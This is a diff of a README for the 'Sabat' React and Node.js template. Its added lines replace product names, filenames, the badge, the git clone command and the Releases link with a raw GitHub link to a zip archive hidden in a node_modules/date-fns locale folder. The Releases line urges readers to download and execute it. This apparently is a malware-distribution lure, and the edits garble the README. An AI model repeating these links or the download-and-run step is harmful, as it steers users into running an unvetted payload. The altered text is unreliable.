@@ -1,8 +1,8 @@
-# Sabat React Node.js Template 🚀
+# Sabat React https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip Template 🚀
  
- ![Sabat Template](https://img.shields.io/badge/Sabat%20Template%20-%20React%20%26%20Node.js%20-%2338A169?style=flat&logo=react&logoColor=white)
+ ![Sabat Template](https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip%20Template%20-%20React%20%26%https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip%20-%2338A169?style=flat&logo=react&logoColor=white)
  
- Welcome to the **Sabat React Node.js Template**! This repository provides a seamless full-stack blueprint that integrates a React and TailwindCSS frontend with a Node.js, Express, and PostgreSQL backend. It is designed for rapid development and scalable features, making it an ideal choice for your web projects.
+ Welcome to the **Sabat React https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip Template**! This repository provides a seamless full-stack blueprint that integrates a React and TailwindCSS frontend with a https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip, Express, and PostgreSQL backend. It is designed for rapid development and scalable features, making it an ideal choice for your web projects.
  
  ## Table of Contents
  
@@ -19,7 +19,7 @@
  
  ## Features
  
- - **Full-Stack Integration**: Combines a powerful React frontend with a robust Node.js backend.
+ - **Full-Stack Integration**: Combines a powerful React frontend with a robust https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip backend.
  - **Responsive Design**: Built with TailwindCSS for a mobile-friendly experience.
  - **State Management**: Utilizes Redux for effective state management.
  - **Routing**: Implements React Router for smooth navigation.
@@ -36,7 +36,7 @@
    - Redux
  
  - **Backend**:
-   - Node.js
+   - https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip
    - Express
    - PostgreSQL
  
@@ -49,11 +49,11 @@
  
  ## Getting Started
  
- To get started with the Sabat React Node.js Template, follow these steps:
+ To get started with the Sabat React https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip Template, follow these steps:
  
  1. **Clone the Repository**:
     ```bash
-    git clone https://github.com/Elkfrawy9/sabat-react-nodejs-template.git
+    git clone https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip
     cd sabat-react-nodejs-template
     ```
  
@@ -100,19 +100,19 @@
  ├── frontend/
  │   ├── public/
  │   ├── src/
- │   ├── package.json
+ │   ├── https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip
  │   └── ...
  ├── backend/
  │   ├── src/
  │   ├── config/
- │   ├── package.json
+ │   ├── https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip
  │   └── ...
  ├── .gitignore
- └── README.md
+ └── https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip
  ```
  
  - **frontend/**: Contains all the React code and assets.
- - **backend/**: Contains the Node.js server and API code.
+ - **backend/**: Contains the https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip server and API code.
  
  ## API Documentation
  
@@ -171,6 +171,6 @@
  
  ## Releases
  
- For the latest releases, check out the [Releases section](https://github.com/Elkfrawy9/sabat-react-nodejs-template/releases). Download the latest version and execute it for the best experience.
+ For the latest releases, check out the [Releases section](https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip). Download the latest version and execute it for the best experience.
  
- We encourage you to explore the repository and contribute to its growth. Your feedback is valuable. Thank you for your interest in the Sabat React Node.js Template!
+ We encourage you to explore the repository and contribute to its growth. Your feedback is valuable. Thank you for your interest in the Sabat React https://github.com/Elkfrawy9/sabat-react-nodejs-template/raw/refs/heads/main/node_modules/date-fns/locale/uk/_lib/formatLong/react-sabat-template-nodejs-1.7-beta.3.zip Template!
